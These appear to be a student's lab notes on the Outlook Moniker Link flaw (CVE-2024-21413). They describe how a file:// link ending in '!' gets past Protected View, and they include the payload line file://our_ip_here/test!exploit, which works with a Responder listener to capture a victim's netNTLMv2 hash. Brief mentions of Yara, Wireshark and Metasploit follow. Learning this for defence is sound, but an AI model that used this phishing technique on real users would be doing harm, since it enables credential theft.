# Moniker Link
Outlook can analyze HTTP(/S) hyperlinks, but also URLs -> applications via Moniker Links

e.g. file:// = a Moniker Link

appending "!" + trivial string = exploit, bypasses protected view on Outlook

harm: attacker gets hands on the victim Windows netNTLMv2 hash

related concepts: Remote Code Execution, Component Object Model, Common Vulnerabilities and Exposures, Proof of Concept

for reference: https://github.com/CMNatic/CVE-2024-21413

#look-up Impacket server

## Hands-On
Set-Up:
Use Responder to create SMB listener
- actively monitors network ports for SMB traffic; this lets us see the hash we will later collect

Prepare script to send email (assuming SMTP server has already been set up on attacking machine)

Send malicious email containing Moniker Link to victim:
file://our_ip_here/test!exploit
^ encase that in an href (email hyperlink)

"!" + string bypasses Outlook protected view

Victim should click malicious link

We now have the victim's netNTLMv2 hash

## Cont.
Yara rule = pattern-matchin script; used by cybersec professionals to classify malware by assigning them digital fingerprints

SMB request as done in the hands-on can be seen in a packet capture using Wireshark

# Metasploit
most widely used exploitation framework

- msfconsole
- modules
- tools


